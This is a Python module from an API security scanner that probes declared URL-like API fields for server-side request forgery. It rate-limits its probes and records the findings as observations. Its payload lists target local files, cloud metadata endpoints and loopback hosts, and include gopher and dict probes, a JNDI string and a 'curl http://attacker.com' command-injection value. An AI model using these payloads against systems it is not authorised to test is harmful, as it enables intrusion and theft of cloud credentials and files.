########################################################
# APISCAN - API Security Scanner                       #
# Licensed under the AGPL-v3.0                         #
# Author: Perry Mertens pamsniffer@gmail.com (C) 2026  #
# version 5.5 24-06-2026                               #
########################################################
from __future__ import annotations

from copy import deepcopy
import base64
import html
import json
import logging
import os
import random
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote_plus, urljoin, urlparse

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tqdm import tqdm

from report_utils import ReportGenerator

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

logger = logging.getLogger(__name__)

Endpoint = Dict[str, Any]
Issue = Dict[str, Any]


#================funtion _headers_to_list normalize headers to list of tuples ##########
def _headers_to_list(hdrs):
    if hasattr(hdrs, "getlist"):
        return [(k, v) for k in hdrs for v in hdrs.getlist(k)]
    try:
        return list(hdrs.items())
    except Exception:
        return []


#================funtion _safe_body safe body extract with size limit ##########
def _safe_body(resp: Optional[requests.Response], limit: int = 2048) -> str:
    if not resp:
        return ""
    try:
        txt = resp.text or ""
        if txt:
            return txt[:limit]
    except Exception:
        pass
    try:
        return (resp.content or b"")[:limit].decode("utf-8", "replace")
    except Exception:
        return ""


#================funtion _abs_url resolve relative path to absolute URL ##########
def _abs_url(base_url: str, rel: str) -> str:
    if rel.startswith(("http://", "https://")):
        return rel
    return urljoin(base_url.rstrip("/") + "/", rel.lstrip("/"))


class SSRFConfig:

    #================funtion __init__ initialize configuration or auditor ##########
    def __init__(self):
        self.timeout = 6
        self.max_concurrency = 10
        self.rps_limit = 8
        self.blind_threshold = 4.0
        self.verify_tls = False
        self.allow_redirects = True
        self.max_redirects = 5
        self.baseline_samples = 2
        self.test_localhost = False
        self.excluded_parameters = ["token", "auth", "password", "secret", "key"]
        self.response_body_limit = 4096
        self.encoding_types = ["default", "double_url", "utf8", "base64", "html"]


class SSRFAuditor:
    CONFIG = SSRFConfig()

    SAFE_FILE_PAYLOADS = [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "file:///c:/windows/win.ini",
    ]
    CLOUD_METADATA_PAYLOADS = [
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/",
    ]
    LOOPBACK_PAYLOADS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",
        "http://127.0.0.1.nip.io/",
    ]
    DNS_REBINDING_PAYLOADS = [
        "http://example.com#@evil.com/",
        "http://example.com@evil.com/",
        "http://127.0.0.1:80@evil.com/",
    ]
    OAST_PAYLOADS = [
        "http://burpcollaborator.net/",
        "http://localtest.me/",
        "http://customer.app.localhost.127.0.0.1.nip.io/",
    ]
    PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:11211/_stats\\r\\nquit\\r\\n",
        "dict://127.0.0.1:11211/stats",
        "ldap://127.0.0.1:389/",
    ]
    LANG_PAYLOADS = [
        "http://127.0.0.1/%0D%0AConnection:%20keep-alive",
        "en;http://169.254.169.254",
        "../../../../etc/passwd",
        "${jndi:ldap://attacker.com}",
        "en|curl http://attacker.com",
    ]

    PAYLOADS = (
        SAFE_FILE_PAYLOADS
        + CLOUD_METADATA_PAYLOADS
        + LOOPBACK_PAYLOADS
        + DNS_REBINDING_PAYLOADS
        + OAST_PAYLOADS
        + PROTOCOL_PAYLOADS
    )

    #================funtion __init__ initialize configuration or auditor ##########
    def __init__(
        self,
        *args,
        session: Optional[requests.Session] = None,
        base_url: Optional[str] = None,
        concurrency: int = CONFIG.max_concurrency,
        rps: int = CONFIG.rps_limit,
        timeout: int = CONFIG.timeout,
        verify_tls: Optional[bool] = None,
        show_progress: bool = True,
        swagger_spec: Optional[Dict[str, Any]] = None,
        flow: Optional[str] = None,
        **kwargs,
    ) -> None:
        if (session is None or base_url is None) and len(args) >= 2:
            if isinstance(args[1], requests.Session):
                base_url, session = args[0], args[1]
            elif isinstance(args[0], requests.Session):
                session, base_url = args[0], args[1]

        if not session or not base_url:
            raise ValueError("session and base_url are required")

        self.base_urls = self._expand_base_urls(str(base_url))
        # Keep a primary base_url for reporting/backward compatibility
        self.base_url = self.base_urls[0].rstrip("/")
        # Scope local-target permission to this auditor, including direct/GUI callers.
        self.CONFIG = deepcopy(type(self).CONFIG)
        self.CONFIG.test_localhost = (urlparse(self.base_url).hostname or '').lower() in {
            'localhost', '127.0.0.1', '::1'
        }


        self.sess = session
        if verify_tls is not None:
            self.sess.verify = verify_tls
        self.concurrency = max(1, min(int(concurrency), self.CONFIG.max_concurrency))
        self.rps = max(1, int(rps))
        self.timeout = int(timeout)
        self.show_progress = bool(show_progress)
        self.spec: Dict[str, Any] = swagger_spec or kwargs.get("spec") or {}
        self.flow: str = (flow or "none").lower()
        self._last_ts = 0.0
        self._lock = threading.Lock()
        self._issues: List[Dict[str, Any]] = []
        self._tested_payloads: set[Tuple[str, str, str, str, str, str]] = set()

    #================funtion _expand_base_urls expand URL into http+https only if scheme missing ##########
    @staticmethod
    def _expand_base_urls(base_url: str) -> List[str]:
        b = (base_url or "").strip()
        if not b:
            return []
        if "://" not in b:
            b = b.rstrip("/")
            return [f"http://{b}", f"https://{b}"]

        parsed = urlparse(b)
        scheme = (parsed.scheme or "").lower()
        normalized = b.rstrip("/")

        if scheme not in {"http", "https"}:
            return [normalized]

        # Respect an explicitly provided scheme. Only expand to both when the
        # caller omitted the scheme entirely.
        return [normalized]

    @staticmethod
    #================funtion endpoints_from_swagger parse Swagger/OpenAPI to endpoint list ##########
    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str = "") -> List[Endpoint]:
        try:
            p = Path(swagger_path)
            raw = p.read_text(encoding="utf-8")
            path_lower = str(swagger_path).lower()
            if path_lower.endswith(('.yml', '.yaml')):
                import yaml as _yaml
                spec = _yaml.safe_load(raw) or {}
            else:
                try:
                    spec = json.loads(raw)
                except json.JSONDecodeError:
                    import yaml as _yaml
                    spec = _yaml.safe_load(raw) or {}
        except Exception as e:
            logger.error(f"Error reading Swagger file: {e}")
            return []

        servers = spec.get("servers") or []
        base = default_base or (servers[0].get("url") if servers and isinstance(servers[0], dict) else "")
        paths = spec.get("paths") or {}

        out: List[Endpoint] = []
        for path, item in paths.items():
            if not isinstance(item, dict):
                continue
            for method, meta in item.items():
                if method.upper() not in {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}:
                    continue
                ep: Endpoint = {
                    "method": method.upper(),
                    "path": path,
                    "url": _abs_url(base or default_base, path),
                    "parameters": [],
                }
                params = []
                if isinstance(item.get("parameters"), list):
                    params.extend(item.get("parameters"))
                if isinstance(meta, dict) and isinstance(meta.get("parameters"), list):
                    params.extend(meta.get("parameters"))
                ep["parameters"] = params
                out.append(ep)
        return out

    #================funtion _tw tqdm-safe write helper ##########
    def _tw(self, msg: str, level: str = "info") -> None:
        _R  = '\033[0m';  _DIM = '\033[2m'
        _RED = '\033[91m'; _YEL = '\033[93m'; _CYN = '\033[96m'
        _icons  = {'error': _RED+'\u2716'+_R, 'warn': _YEL+'\u25b2'+_R,
                   'info':  _CYN+'\u25c6'+_R, 'debug': _DIM+'\u00b7'+_R,
                   'skip':  _DIM+'\u2014'+_R,  'run':  _CYN+'\u25b6'+_R}
        _labels = {'error': _RED+'Error'+_R, 'warn': _YEL+'Warn'+_R,
                   'info':  _CYN+'Info'+_R,  'debug': _DIM+'Debug'+_R,
                   'skip':  _DIM+'Skip'+_R,   'run':  _CYN+'Test'+_R}
        ic = _icons.get(level, _icons['info'])
        lb = _labels.get(level, _labels['info'])
        # Condense timeout noise
        _msg = msg
        if 'timed out' in msg.lower() or 'timeout' in msg.lower():
            import re as _re
            _ep = _re.search(r'((?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+/\S*)', msg)
            _mt = _re.search(r'(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)', msg)
            if _ep:
                _msg = _ep.group(1) + '  \033[2mTimeout\033[0m'
            elif _mt:
                _msg = _mt.group(1) + '  \033[2mTimeout\033[0m'
            else:
                _msg = '\033[2mTimeout\033[0m'
        elif len(msg) > 110:
            _msg = msg[:107] + '...'
        text = f"  {ic}  {lb}  {_msg}"
        if self.show_progress:
            tqdm.write(text)
        else:
            print(text)

    #================funtion _pace simple rate limiting between requests ##########
    def _pace(self) -> None:
        now = time.perf_counter()
        min_gap = 1.0 / float(self.rps)

        with self._lock:
            wait = max(0.0, self._last_ts + min_gap - now)

        if wait > 0:
            time.sleep(wait)

        with self._lock:
            self._last_ts = time.perf_counter()

    #================funtion _encode_payload encode SSRF payload using chosen scheme ##########
    def _encode_payload(self, payload: str, encoding_type: str = "default") -> str:
        if encoding_type == "default":
            # requests encodes query parameters; JSON/header URLs must stay usable.
            return payload
        elif encoding_type == "double_url":
            return quote_plus(quote_plus(payload))
        elif encoding_type == "utf8":
            return quote_plus(payload.encode("utf-8"))
        elif encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == "html":
            return html.escape(payload)
        else:
            return quote_plus(payload)

    #================funtion test_endpoints run SSRF scans across endpoints ##########
    def _should_exclude_param(self, name: str) -> bool:
        n = (name or "").lower()
        for kw in self.CONFIG.excluded_parameters:
            if kw and kw.lower() in n:
                return True
        return False

    def _merge_headers(self, hdrs: Optional[dict]) -> dict:
        merged: Dict[str, Any] = {}
        try:
            merged.update(getattr(self.sess, "headers", {}) or {})
        except Exception:
            pass
        if hdrs:
            merged.update(hdrs)
        return merged

    def _baseline_latency(self, url: str, method: str, ep: Endpoint) -> float:
        samples = max(1, int(getattr(self.CONFIG, "baseline_samples", 1)))
        vals: List[float] = []
        for _ in range(samples):
            started = time.perf_counter()
            try:
                response = self._request(ep, method, url)
                if response.status_code >= 400:
                    continue
            except Exception:
                continue
            vals.append(time.perf_counter() - started)
        if not vals:
            return 0.0
        vals.sort()
        return vals[len(vals) // 2]

    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
        self._issues.clear()
        self._tested_payloads.clear()
        self.diagnostics = []
        self.coverage = dict(audit="API7", input_endpoints=len(endpoints), started=0,
                             completed=0, failed=0, skipped=0, not_applicable=0,
                             rejected_payloads=0, scope_limited=True,
                             note="Only declared URL-like query/header/JSON fields; configured probe limits apply.")
        with ThreadPoolExecutor(max_workers=self.concurrency) as ex:
            futures = {ex.submit(self._scan_endpoint, deepcopy(ep)): ep for ep in endpoints}
            iterator = as_completed(futures)
            if self.show_progress:
                iterator = tqdm(iterator, total=len(futures), desc="SSRF scans", unit="endpoint")
            for future in iterator:
                try:
                    future.result()
                except Exception as exc:
                    with self._lock:
                        self.coverage["skipped"] += 1
                        self.diagnostics.append(dict(audit="API7", endpoint=futures[future], error=str(exc)))
        self.coverage["state"] = "incomplete" if self.coverage["failed"] or self.coverage["skipped"] else ("completed" if self.coverage["started"] else "not_applicable")
        self._tw("API7 coverage: " + json.dumps(self.coverage), "done")
        return self._issues

    def _schema_request(self, ep, base):
        from openapi_universal import iter_operations, build_request
        op = next((op for op in iter_operations(self.spec)
                   if op.get("path") == ep.get("path") and op.get("method", "").upper() == ep.get("method", "GET").upper()), None)
        if op is None:
            raise ValueError("Operation missing from OpenAPI specification")
        ep["_request"] = build_request(self.spec, base, op, None)
        def url_like(name, value=None, schema=None):
            return (any(word in name.lower() for word in ('url','uri','callback','webhook','endpoint','destination','redirect'))
                    or (schema or {}).get('format') in ('uri','url','uri-reference')
                    or isinstance(value,str) and value.lower().startswith(('http://','https://')))
        ep['_inputs'] = {}
        ep['_json_paths'] = {}
        for param in op.get('parameters',[]):
            loc = param.get('in'); name = param.get('name','')
            values = ep['_request'].get('params' if loc == 'query' else 'headers',{})
            if loc in ('query','header') and url_like(name, values.get(name), param.get('schema')):
                ep['_inputs'][name] = loc
        def walk(value, path=()):
            if len(path)>8: return
            if isinstance(value,dict):
                for key,child in value.items(): walk(child,path+(key,))
            elif isinstance(value,list):
                for index,child in enumerate(value[:16]): walk(child,path+(index,))
            elif path and url_like(str(path[-1]),value):
                label = path[0] if len(path)==1 else 'json:/'+'/'.join(map(str,path))
                ep['_inputs'][label] = 'json'
                ep['_json_paths'][label] = path
        walk(ep['_request'].get('json'))
        if isinstance(ep['_request'].get('data'),dict):
            ep['_inputs'].update({key:'data' for key,value in ep['_request']['data'].items() if url_like(key,value)})

    def _request(self, ep, method, url, json_body=None, data=None, headers=None, param=None, payload=None):
        req = deepcopy(ep.get("_request", {}))
        req.update(method=method, url=url, timeout=self.timeout,
                   allow_redirects=self.CONFIG.allow_redirects, verify=self.sess.verify)
        req["headers"] = self._merge_headers(dict(req.get("headers", {}), **(headers or {})))
        if json_body is not None:
            req.pop("data", None)
            req["json"] = json_body
        if param and ep.get("_inputs", {}).get(param) == "query":
            req.setdefault("params", {})[param] = payload
        with self._lock:
            self.coverage["started"] += 1
        try:
            response = self.sess.request(**req)
        except Exception as exc:
            with self._lock:
                self.coverage["failed"] += 1
                self.diagnostics.append(dict(audit="API7", endpoint=url, error=str(exc)))
            raise
        with self._lock:
            if response.status_code == 415 or (param is None and response.status_code >= 400):
                self.coverage["failed"] += 1
                self.diagnostics.append(dict(audit="API7", endpoint=url, status=response.status_code, error="Request rejected"))
            else:
                self.coverage["completed"] += 1
                if response.status_code >= 400:
                    self.coverage["rejected_payloads"] += 1
        return response

    def save_diagnostics(self, directory):
        directory = Path(directory)
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "coverage_api7.json").write_text(json.dumps(self.coverage, indent=2), encoding="utf-8")
        (directory / "telemetry_api7.json").write_text(json.dumps(self.diagnostics, indent=2), encoding="utf-8")

    #================funtion _scan_endpoint enumerate params and dispatch probes ##########
    def _scan_endpoint(self, ep: Endpoint) -> None:
        method = (ep.get("method") or "GET").upper()
        path = ep.get("path") or ""

        ep_bases: List[str] = []
        if isinstance(ep.get("base_list"), list) and ep["base_list"]:
            ep_bases = [str(x).rstrip("/") for x in ep["base_list"] if str(x).strip()]
        elif ep.get("base"):
            ep_bases = self._expand_base_urls(str(ep.get("base")))

        # The explicitly selected target controls request scope, not Swagger servers.
        bases = self.base_urls
        if not bases:
            return

        for base in bases:
            from scanner_quality import normalize_endpoint, path_values
            url_base = normalize_endpoint(path, base, path_values(self.spec, getattr(self, "path_parameter_values", {})))
            self._schema_request(ep, base)

            self._scan_single_base(ep, url_base, method)

    #================funtion _scan_single_base scan endpoint for a single base URL ##########
    def _scan_single_base(self, ep: Endpoint, url_base: str, method: str) -> None:
        host = (urlparse(url_base).hostname or "").lower()

        if not self.CONFIG.test_localhost and host in {"127.0.0.1", "localhost", "::1"}:
            with self._lock:
                self.coverage['skipped'] += 1
                self.diagnostics.append(dict(audit='API7', endpoint=url_base,
                    error='Local target disabled by scanner configuration'))
            self._tw(f"Localhost target — skipping {method} {url_base}", "skip")
            return

        if self.show_progress:
            self._tw(f"{method} {url_base}", "run")


        all_params = sorted(ep.get("_inputs", {}))
        if not all_params:
            with self._lock:
                self.coverage["not_applicable"] += 1
            return
        ep["_baseline"] = self._baseline_latency(url_base, method, ep)
        if ep["_baseline"] <= 0:
            with self._lock:
                self.coverage["skipped"] += 1
            return
        p_iter = tqdm(all_params, desc="params", unit="param", leave=False) if self.show_progress else all_params
        # Limit SSRF probes to avoid combinatorial explosion:
        # 397 endpoints × 11 params × 30 payloads × 5 encodings = 655K+ requests.
        # Smart limiting: max 3 params, 4 payloads/param, 2 encodings.
        max_params = int(os.environ.get('APISCAN_SSRF_MAX_PARAMS', '3'))
        max_payloads = int(os.environ.get('APISCAN_SSRF_MAX_PAYLOADS', '4'))
        max_encodings = int(os.environ.get('APISCAN_SSRF_MAX_ENCODINGS', '2'))
        tested_params = 0
        for param in p_iter:
            if tested_params >= max_params:
                break
            payloads = list(self.PAYLOADS)
            random.shuffle(payloads)
            payloads = payloads[:max_payloads]
            encodings = self.CONFIG.encoding_types[:max_encodings]
            for payload in payloads:
                for encoding in encodings:
                    encoded_payload = self._encode_payload(payload, encoding)
                    self._probe_params(ep, url_base, method, param, encoded_payload, encoding)

            if param in {"lang", "language", "locale", "v", "version"}:
                for payload in self.LANG_PAYLOADS[:max_payloads]:
                    for encoding in encodings:
                        encoded_payload = self._encode_payload(payload, encoding)
                        self._probe_params(ep, url_base, method, param, encoded_payload, encoding)
            tested_params += 1

    #================funtion _probe_params send probes in query, body, headers, and path ##########
    def _probe_params(
        self,
        ep: Endpoint,
        base_url: str,
        method: str,
        param: str,
        payload: str,
        encoding: str = "default",
    ) -> None:
        # Include base_url so HTTP and HTTPS both get tested (no cross-scheme dedupe)
        key = (ep.get("method", ""), ep.get("path", ""), base_url, param, payload, encoding)
        with self._lock:
            if key in self._tested_payloads:
                return
            self._tested_payloads.add(key)

        self._pace()

        loopback_hosts = {"localhost", "127.0.0.1", "::1"}
        if any(lp in payload for lp in loopback_hosts):
            self._tw(f"Payload targets localhost: {payload}", "warn")

        host = (urlparse(base_url).hostname or "").lower()
        if not self.CONFIG.test_localhost and host in loopback_hosts:
            self._tw(f"Base URL is localhost; skipping param={param}", "skip")
            return

        location = ep.get("_inputs", {}).get(param)
        if location == "json":
            body = deepcopy(ep["_request"].get("json", {}))
            path = ep.get('_json_paths',{}).get(param,(param,))
            node = body
            for key in path[:-1]: node = node[key]
            node[path[-1]] = payload
            self._probe(ep, base_url, method, json_body=body, payload=payload, param=param, encoding=encoding)
        elif location == 'data':
            data = deepcopy(ep['_request'].get('data',{}))
            data[param] = payload
            self._probe(ep, base_url, method, data=data, payload=payload, param=param, encoding=encoding)
        elif location == "query":
            self._probe(ep, base_url, method, payload=payload, param=param, encoding=encoding)
        elif location == "header":
            self._probe(ep, base_url, method, headers={param: payload}, payload=payload, param=param, encoding=encoding)

    #================funtion _probe perform single HTTP request and analyze response ##########
    def _probe(
        self,
        ep: Endpoint,
        url: str,
        method: str,
        *,
        json_body: Optional[dict] = None,
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
        payload: str,
        param: str,
        encoding: str = "default",
    ) -> None:
        started = time.perf_counter()
        try:
            resp = self._request(ep, method, url, json_body, data, headers, param, payload)
            if resp.status_code >= 400:
                return
            latency = time.perf_counter() - started
        except requests.exceptions.SSLError as e:
            logger.warning(f"SSL error for {url}: {e}")
            return
        except socket.timeout:
            logger.warning(f"Timeout for {url}")
            return
        except Exception as e:
            logger.error(f"Unexpected error while testing {url}: {e}")
            return

        body_low = _safe_body(resp, self.CONFIG.response_body_limit).lower()
        hdr_low = ""
        try:
            hdr_low = " ".join([f"{k}:{v}" for k, v in (resp.headers or {}).items()]).lower()
        except Exception:
            hdr_low = ""
        header_indicators = ("metadata-flavor", "x-aws-ec2-metadata", "x-envoy", "server: envoy")

        baseline = float(ep.get("_baseline", 0.0) or 0.0)
        is_blind = latency >= self.CONFIG.blind_threshold
        if baseline > 0.0:
            is_blind = is_blind and latency >= (baseline * 2.0)

        if is_blind:
            self._record_issue(
                ep=ep,
                payload=payload,
                status=resp.status_code,
                latency=latency,
                note=f"Potential blind SSRF (latency {latency:.2f}s)",
                param=param,
                encoding=encoding,
                request_headers=_headers_to_list(getattr(getattr(resp, "request", None), "headers", {})),
                response_headers=_headers_to_list(resp.headers),
                response_body=_safe_body(resp, self.CONFIG.response_body_limit),
                request_cookies=self.sess.cookies.get_dict(),
                response_cookies=resp.cookies.get_dict(),
            )
            return

        indicators = (
            "169.254.169.254",
            "metadata.google.internal",
            "computemetadata",
            "service-accounts",
            "instance-id",
            "ami-id",
            "root:x:",
            "/etc/passwd",
            "localhost",
            "127.0.0.1",
            "[::1]",
        )
        if payload.lower() in body_low:
            return
        if any(ind in body_low for ind in indicators) or any(h in hdr_low for h in header_indicators):
            self._record_issue(
                ep=ep,
                payload=payload,
                status=resp.status_code,
                latency=latency,
                note="Reflected SSRF indicators in response",
                param=param,
                encoding=encoding,
                request_headers=_headers_to_list(getattr(getattr(resp, "request", None), "headers", {})),
                response_headers=_headers_to_list(resp.headers),
                response_body=_safe_body(resp, self.CONFIG.response_body_limit),
                request_cookies=self.sess.cookies.get_dict(),
                response_cookies=resp.cookies.get_dict(),
            )

    #================funtion _calculate_confidence classify confidence based on evidence ##########
    def _calculate_confidence(self, latency: float, response_body: str, response_headers: Optional[dict] = None) -> str:
        body = response_body or ""
        hdrs = ""
        try:
            hdrs = " ".join([f"{k}:{v}" for k, v in (response_headers or {}).items()]).lower()
        except Exception:
            hdrs = ""

        if ("root:x:" in body) or ("169.254.169.254" in body) or ("computemetadata" in body.lower()) or ("metadata-flavor" in hdrs):
            return "High"
        if latency > self.CONFIG.blind_threshold:
            return "Medium"
        return "Low"

    #================funtion _record_issue record a single SSRF finding ##########
    def _record_issue(
        self,
        ep: Endpoint,
        payload: str,
        status: int,
        latency: float,
        note: str,
        param: Optional[str] = None,
        encoding: Optional[str] = None,
        request_headers: Optional[list] = None,
        response_headers: Optional[list] = None,
        response_body: Optional[str] = None,
        request_cookies: Optional[dict] = None,
        response_cookies: Optional[dict] = None,
    ) -> None:
        confidence = self._calculate_confidence(latency, response_body or "", response_headers=dict(response_headers or {}))
        issue = {
            "endpoint": f"{ep.get('method', 'GET')} {ep.get('path', '')}",
            "parameter": param or "N/A",
            "payload": payload,
            "encoding": encoding or "default",
            "status_code": status,
            "latency": round(latency, 2),
            "description": 'Observation: '+note+'; server-side fetch not independently verified',
            "severity": 'Info' if 'latency' in note.lower() else 'Low',
            "evidence_status": 'observation',
            "confidence": confidence,
            "timestamp": datetime.utcnow().isoformat(),
            "request_headers": request_headers or [],
            "response_headers": response_headers or [],
            "request_body": None,
            "response_body": response_body or "",
            "request_cookies": request_cookies or {},
            "response_cookies": response_cookies or {},
            "evidence": (response_body or "")[:500],
            "reproduction_steps": f"Send {ep.get('method', 'GET')} request to {ep.get('path', '')} with {param}={payload}",
        }
        with self._lock:
            key = (issue["endpoint"], issue["parameter"], issue["payload"], issue["description"])
            if not any((i["endpoint"], i["parameter"], i["payload"], i["description"]) == key for i in self._issues):
                if self.show_progress:
                    _R = '\033[0m'; _YEL = '\033[93m'; _CYN = '\033[96m'; _BR = '\033[1m\033[91m'
                    tqdm.write(
                        f"  {_YEL}\u25c8{_R}  {_BR}SSRF{_R}  {issue['description']}  "
                        f"{_CYN}@{_R}  {issue['endpoint']}  "
                        f"\033[2m(param: {issue['parameter']}, confidence: {confidence})\033[0m"
                    )
                self._issues.append(issue)

    #================funtion _filtered_findings deduplicate issues for reporting ##########
    def _filtered_findings(self) -> List[dict]:
        src = getattr(self, "_issues", getattr(self, "issues", []))
        out: List[dict] = []
        seen: set = set()
        for i in src:
            key = (
                i.get("endpoint"),
                i.get("parameter"),
                i.get("payload"),
                i.get("description"),
                i.get("status_code"),
            )
            if key in seen:
                continue
            seen.add(key)
            out.append(i)
        return out

    #================funtion generate_report build HTML/Markdown report ##########
    def generate_report(self, fmt: str = "html") -> str:
        issues = self._filtered_findings()
        if not issues:
            issues = [
                {
                    "endpoint": "-",
                    "description": "No SSRF findings detected",
                    "severity": "Info",
                    "status_code": 200,
                    "timestamp": datetime.utcnow().isoformat(),
                    "request_headers": [],
                    "response_headers": [],
                    "response_body": "",
                }
            ]
        gen = ReportGenerator(issues, scanner="SSRF (API7)", base_url=self.base_url)
        return gen.generate_html() if fmt == "html" else gen.generate_markdown()

    #================funtion save_report persist report to disk ##########
    def save_report(self, path: str, fmt: str = "html") -> None:
        issues = self._filtered_findings()
        ReportGenerator(issues, scanner="SSRF (API7)", base_url=self.base_url).save(path, fmt=fmt)
